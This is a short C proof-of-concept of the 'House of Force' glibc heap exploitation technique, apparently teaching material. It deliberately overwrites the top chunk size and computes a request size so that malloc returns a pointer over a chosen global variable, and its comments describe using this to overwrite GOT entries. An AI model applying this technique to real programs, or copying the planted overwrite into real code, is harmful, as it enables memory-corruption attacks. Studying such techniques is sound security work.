/*
   This PoC works also with ASLR enabled.
   It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.
   If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum
   ( http://phrack.org/issues/66/10.html )
   Tested in Ubuntu 14.04, 64bit, Ubuntu 18.04
*/
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>
#include <assert.h>
char bss_var[] = "This is a string that we want to overwrite.";
int main(int argc, char *argv[])
{
	intptr_t *p1 = malloc(256);
	int real_size = malloc_usable_size(p1);
	//----- VULNERABILITY ----
	intptr_t *ptr_top = (intptr_t *)((char *)p1 + real_size - sizeof(long));
	*(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;
	//------------------------
	/*
	 * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):
	 * new_top = old_top + nb
	 * nb = new_top - old_top
	 * req + 2sizeof(long) = new_top - old_top
	 * req = new_top - old_top - 2sizeof(long)
	 * req = dest - 2sizeof(long) - old_top - 2sizeof(long)
	 * req = dest - old_top - 4*sizeof(long)
	 */
	unsigned long evil_size = (unsigned long)bss_var - sizeof(long) * 4 - (unsigned long)ptr_top;
	void *new_ptr = malloc(evil_size);
	void *ctr_chunk = malloc(100);
	strcpy(ctr_chunk, "YEAH!!!");
	assert(ctr_chunk == bss_var);
}
